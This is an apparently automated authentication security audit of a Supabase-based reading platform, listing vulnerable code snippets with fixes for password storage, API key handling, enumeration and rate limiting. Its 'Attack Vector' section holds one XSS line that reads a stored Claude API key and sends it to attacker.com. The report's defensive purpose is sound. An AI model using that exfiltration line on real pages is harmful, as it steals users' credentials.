# Authentication Security Analysis Report

## Close-Reading Platform
**Date:** November 22, 2025
**Analyst:** Code Quality Analyzer
**Scope:** Authentication, Login, and Authorization Security

---

## Executive Summary

### Overall Authentication Security Score: 7.5/10

The Close-Reading Platform demonstrates **solid authentication fundamentals** built on Supabase Auth with proper session management and Row Level Security. However, several vulnerabilities and areas for improvement were identified, primarily in the mock development environment and client-side validation.

### Findings Summary

| Severity | Count | Description |
|----------|-------|-------------|
| Critical | 0 | No critical authentication vulnerabilities |
| High | 2 | Mock mode security, API key storage |
| Medium | 3 | Password validation, session handling, error disclosure |
| Low | 4 | Input sanitization, logging, test coverage |
| Info | 2 | Best practice recommendations |

---

## Critical Issues

### No Critical Authentication Bugs Found

The core authentication implementation is sound, leveraging Supabase's enterprise-grade authentication system.

---

## High-Risk Issues

### 1. Mock Authentication Stores Plaintext Passwords

**Severity:** HIGH
**File:** `/mnt/c/Users/brand/Development/Project_Workspace/active-development/close_reading/src/lib/mock/auth.ts`
**Lines:** 65-112

**Issue Description:**
The mock authentication service stores and compares passwords in plaintext within IndexedDB.

**Vulnerable Code:**
```typescript
// Line 72-73: Plaintext password comparison
const user = await this.db.getFromIndex('users', 'by-email', email);
if (user && user.password === password) {
  // Authentication successful
}

// Line 126-132: Plaintext password storage
const user = {
  id: this.generateId(),
  email,
  password,  // Stored as plaintext
  created_at: new Date().toISOString(),
  user_metadata: {},
};
await this.db.add('users', user);
```

**Impact:**
- Passwords visible in browser developer tools (IndexedDB)
- If mock data leaks, all passwords are exposed
- Bad practice that could propagate to production code
- Developers may become accustomed to insecure patterns

**Recommendation:**
```typescript
import { hash, compare } from 'bcryptjs';

// During signup
const hashedPassword = await hash(password, 10);
const user = { ...userData, password: hashedPassword };

// During signin
const isValid = await compare(password, user.password);
```

**Note:** While this is mock/development code, security best practices should be followed to:
1. Prevent accidental deployment
2. Train developers on proper patterns
3. Protect development/test user credentials

---

### 2. Claude API Key Stored in localStorage

**Severity:** HIGH
**File:** `/mnt/c/Users/brand/Development/Project_Workspace/active-development/close_reading/src/components/ai/ApiKeySettings.tsx`
**Lines:** 51-83

**Issue Description:**
The Claude API key is stored in plaintext in localStorage, which is accessible to any JavaScript running on the page.

**Vulnerable Code:**
```typescript
// Line 52-63: Loading from localStorage
useEffect(() => {
  const saved = localStorage.getItem('claude-config');
  if (saved) {
    const parsed = JSON.parse(saved);  // API key in plaintext
    setConfig(parsed);
  }
}, []);

// Line 82-83: Saving to localStorage
localStorage.setItem('claude-config', JSON.stringify(config));  // API key in plaintext
```

**Impact:**
- XSS attacks can steal API keys
- Browser extensions can access localStorage
- API keys visible in browser developer tools
- Shared computers expose keys to other users

**Attack Vector:**
```javascript
// Any XSS can steal the API key
const config = JSON.parse(localStorage.getItem('claude-config'));
fetch('https://attacker.com/steal?key=' + config.apiKey);
```

**Recommendations:**
1. **Server-side proxy:** Route API calls through your backend
2. **Session-only storage:** Store in memory/sessionStorage with session timeout
3. **Encryption:** Use Web Crypto API for at-rest encryption
4. **User warning:** Clearly inform users about local storage risks

```typescript
// Encrypt before storing
const encryptedKey = await encryptWithUserPassword(config.apiKey);
localStorage.setItem('claude-config-encrypted', encryptedKey);
```

---

## Medium-Risk Issues

### 3. No Password Strength Validation

**Severity:** MEDIUM
**File:** `/mnt/c/Users/brand/Development/Project_Workspace/active-development/close_reading/src/hooks/useAuth.ts`
**Lines:** 72-80

**Issue Description:**
The signup function accepts any password without strength validation.

**Current Code:**
```typescript
const signUp = async (email: string, password: string) => {
  setLoading(true);
  setError(null);
  const { error } = await supabase.auth.signUp({
    email,
    password,  // No validation
  });
  if (error) setError(error);
  setLoading(false);
};
```

**Impact:**
- Users can set weak passwords (e.g., "123", "password")
- Accounts vulnerable to brute-force attacks
- No complexity requirements enforced

**Recommendation:**
```typescript
const PASSWORD_REQUIREMENTS = {
  minLength: 8,
  requireUppercase: true,
  requireLowercase: true,
  requireNumber: true,
  requireSpecial: false,
};

function validatePassword(password: string): string[] {
  const errors: string[] = [];
  if (password.length < PASSWORD_REQUIREMENTS.minLength) {
    errors.push(`Password must be at least ${PASSWORD_REQUIREMENTS.minLength} characters`);
  }
  if (PASSWORD_REQUIREMENTS.requireUppercase && !/[A-Z]/.test(password)) {
    errors.push('Password must contain an uppercase letter');
  }
  if (PASSWORD_REQUIREMENTS.requireLowercase && !/[a-z]/.test(password)) {
    errors.push('Password must contain a lowercase letter');
  }
  if (PASSWORD_REQUIREMENTS.requireNumber && !/\d/.test(password)) {
    errors.push('Password must contain a number');
  }
  return errors;
}

const signUp = async (email: string, password: string) => {
  const passwordErrors = validatePassword(password);
  if (passwordErrors.length > 0) {
    setError({ message: passwordErrors.join('. ') } as AuthError);
    return;
  }
  // Continue with signup...
};
```

---

### 4. Login Page Error State Leaks Authentication Status

**Severity:** MEDIUM
**File:** `/mnt/c/Users/brand/Development/Project_Workspace/active-development/close_reading/src/pages/LoginPage.tsx`
**Lines:** 46-55

**Issue Description:**
Error handling reveals whether an email exists in the system, enabling user enumeration attacks.

**Current Code:**
```typescript
} catch (err) {
  toaster.create({
    title: 'Login failed',
    description: error?.message || 'Please check your credentials',  // Reveals specific error
    type: 'error',
    duration: 5000,
  });
}
```

**Impact:**
- Attackers can determine which emails are registered
- Enables targeted phishing attacks
- Violates privacy expectations

**Recommendation:**
```typescript
// Always show generic message regardless of failure reason
toaster.create({
  title: 'Login failed',
  description: 'Invalid email or password',  // Generic message
  type: 'error',
  duration: 5000,
});

// Log specific error for debugging (server-side only in production)
logger.warn({ email, errorCode: error?.code }, 'Login attempt failed');
```

---

### 5. Session State Not Cleared on Auth Errors

**Severity:** MEDIUM
**File:** `/mnt/c/Users/brand/Development/Project_Workspace/active-development/close_reading/src/hooks/useAuth.ts`
**Lines:** 61-69

**Issue Description:**
When signIn fails, the loading state is updated but stale session data may persist if there's a race condition.

**Current Code:**
```typescript
const signIn = async (email: string, password: string) => {
  setLoading(true);
  setError(null);
  const { error } = await supabase.auth.signInWithPassword({
    email,
    password,
  });
  if (error) setError(error);
  setLoading(false);  // User/session state not explicitly cleared on error
};
```

**Recommendation:**
```typescript
const signIn = async (email: string, password: string) => {
  setLoading(true);
  setError(null);

  try {
    const { data, error } = await supabase.auth.signInWithPassword({
      email,
      password,
    });

    if (error) {
      setUser(null);
      setSession(null);
      setError(error);
    } else {
      setUser(data.user);
      setSession(data.session);
    }
  } catch (e) {
    setUser(null);
    setSession(null);
    setError({ message: 'An unexpected error occurred' } as AuthError);
  } finally {
    setLoading(false);
  }
};
```

---

## Low-Risk Issues

### 6. Email Logging May Expose PII

**Severity:** LOW
**File:** `/mnt/c/Users/brand/Development/Project_Workspace/active-development/close_reading/src/hooks/useAuth.ts`
**Lines:** 31-34, 48-52

**Issue Description:**
User emails are logged on authentication events, which may violate privacy policies.

**Current Code:**
```typescript
logger.info({
  hasUser: !!session?.user,
  userEmail: session?.user?.email  // PII exposure
}, 'Initial session loaded');
```

**Recommendation:**
```typescript
logger.info({
  hasUser: !!session?.user,
  userId: session?.user?.id,  // Use ID instead of email
  // Or hash the email: emailHash: hashEmail(session?.user?.email)
}, 'Initial session loaded');
```

---

### 7. Mock Token Generation Uses Predictable Pattern

**Severity:** LOW
**File:** `/mnt/c/Users/brand/Development/Project_Workspace/active-development/close_reading/src/lib/mock/auth.ts`
**Lines:** 49-51, 89-91

**Issue Description:**
Mock tokens follow a predictable pattern that includes the user ID.

**Current Code:**
```typescript
const session = user ? {
  access_token: `mock_token_${user.id}`,  // Predictable pattern
  refresh_token: `mock_refresh_${user.id}`,  // User ID exposed
  user: user,
} : null;
```

**Impact (Development Only):**
- Tokens can be guessed if user IDs are known
- User IDs leaked in tokens

**Recommendation:**
```typescript
const generateMockToken = () => {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return Array.from(array, b => b.toString(16).padStart(2, '0')).join('');
};

const session = user ? {
  access_token: `mock_${generateMockToken()}`,
  refresh_token: `mock_${generateMockToken()}`,
  user: user,
} : null;
```

---

### 8. No Rate Limiting on Login Attempts

**Severity:** LOW
**Files:**
- `/mnt/c/Users/brand/Development/Project_Workspace/active-development/close_reading/src/hooks/useAuth.ts`
- `/mnt/c/Users/brand/Development/Project_Workspace/active-development/close_reading/src/pages/LoginPage.tsx`

**Issue Description:**
No client-side rate limiting on login attempts. While Supabase provides server-side rate limiting, client-side limiting can prevent unnecessary API calls.

**Recommendation:**
```typescript
const MAX_LOGIN_ATTEMPTS = 5;
const LOCKOUT_DURATION = 15 * 60 * 1000; // 15 minutes

const [loginAttempts, setLoginAttempts] = useState(0);
const [lockoutUntil, setLockoutUntil] = useState<number | null>(null);

const handleLogin = async (e: React.FormEvent) => {
  e.preventDefault();

  if (lockoutUntil && Date.now() < lockoutUntil) {
    const remainingMinutes = Math.ceil((lockoutUntil - Date.now()) / 60000);
    toaster.create({
      title: 'Too many attempts',
      description: `Please wait ${remainingMinutes} minutes before trying again`,
      type: 'warning',
    });
    return;
  }

  // ... login logic

  if (error) {
    const newAttempts = loginAttempts + 1;
    setLoginAttempts(newAttempts);
    if (newAttempts >= MAX_LOGIN_ATTEMPTS) {
      setLockoutUntil(Date.now() + LOCKOUT_DURATION);
    }
  } else {
    setLoginAttempts(0);
  }
};
```

---

### 9. withAuth HOC Shows Generic "Authentication Required" Without Redirect

**Severity:** LOW
**File:** `/mnt/c/Users/brand/Development/Project_Workspace/active-development/close_reading/src/contexts/AuthContext.tsx`
**Lines:** 63-77

**Issue Description:**
The `withAuth` HOC displays a static message instead of redirecting to login page.

**Current Code:**
```typescript
if (!user) {
  return (
    <div style={{...}}>
      <h2>Authentication Required</h2>
      <p>Please sign in to access this content.</p>
    </div>
  );
}
```

**Recommendation:**
```typescript
import { Navigate, useLocation } from 'react-router-dom';

if (!user) {
  return <Navigate to="/login" state={{ from: location }} replace />;
}
```

---

## Informational Findings

### 10. Supabase RLS Properly Implemented

**Status:** POSITIVE FINDING
**Files:** `/mnt/c/Users/brand/Development/Project_Workspace/active-development/close_reading/supabase/migrations/`

The database schema implements comprehensive Row Level Security (RLS) policies that enforce user isolation at the database level. This is excellent defense-in-depth.

**Verified Policies:**
- Users can only access their own projects, documents, annotations
- Share links have proper ownership validation
- No cross-user data access possible

---

### 11. XSS Vulnerability Previously Identified and Fixed

**Status:** RESOLVED
**File:** `/mnt/c/Users/brand/Development/Project_Workspace/active-development/close_reading/src/pages/SharedDocumentPage.tsx`
**Lines:** 148-154

The previous security audit identified an XSS vulnerability via `dangerouslySetInnerHTML`. This has been properly fixed with DOMPurify sanitization:

```typescript
dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(document.content, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'ul', 'ol', 'li', 'blockquote', 'code', 'pre'],
    ALLOWED_ATTR: [],
    KEEP_CONTENT: true
  })
}}
```

---

## Security Test Coverage Analysis

### Existing Auth-Related Tests

The codebase has reasonable test coverage for authentication-related functionality:

| Test File | Coverage | Status |
|-----------|----------|--------|
| `tests/unit/sharing.test.ts` | Auth checks | PASS |
| `tests/integration/sharing-flow.test.ts` | Unauthorized access | PASS |
| `tests/unit/ml/cache.test.ts` | Auth user isolation | PASS |

### Missing Test Coverage

The following auth scenarios need tests:

1. **Password validation tests** - No tests for password strength
2. **Session expiration tests** - No tests for expired token handling
3. **Rate limiting tests** - No tests for login attempt limits
4. **Concurrent session tests** - No tests for multiple device handling

---

## Recommendations Summary

### Immediate Actions (This Week)

1. **Add password strength validation** to signup flow
2. **Implement generic error messages** on login to prevent enumeration
3. **Update mock auth** to use hashed passwords

### Short-Term (This Month)

4. **Replace localStorage API key storage** with server-side proxy or encrypted storage
5. **Add client-side rate limiting** for login attempts
6. **Remove PII from logs** (emails -> user IDs)

### Long-Term (Next Quarter)

7. **Implement 2FA/MFA** support via Supabase
8. **Add session management UI** (view/revoke active sessions)
9. **Set up security monitoring** for auth events
10. **Regular penetration testing** of auth flows

---

## Compliance Checklist

| Requirement | Status | Notes |
|-------------|--------|-------|
| Secure password storage | PASS (Supabase) | Mock mode needs improvement |
| Session management | PASS | Proper JWT handling |
| Brute force protection | PARTIAL | Server-side only |
| User enumeration prevention | FAIL | Login errors reveal status |
| HTTPS enforcement | PASS | Via Supabase |
| Secure cookie flags | PASS | Supabase defaults |
| CSRF protection | PASS | SameSite cookies |
| SQL injection | PASS | Parameterized queries |

---

## Conclusion

The Close-Reading Platform has a solid authentication foundation built on Supabase Auth. The primary concerns are around the development/mock environment security practices and client-side API key handling. The production authentication flow leverages Supabase's enterprise-grade security features effectively.

**Priority Fixes:**
1. Mock password hashing (prevent bad habits)
2. API key storage security (high user impact)
3. Password validation (compliance requirement)
4. Login error messages (privacy/security)

With these fixes applied, the authentication security score would improve from 7.5/10 to approximately 9/10.

---

**Report Generated:** November 22, 2025
**Next Review Recommended:** February 22, 2026
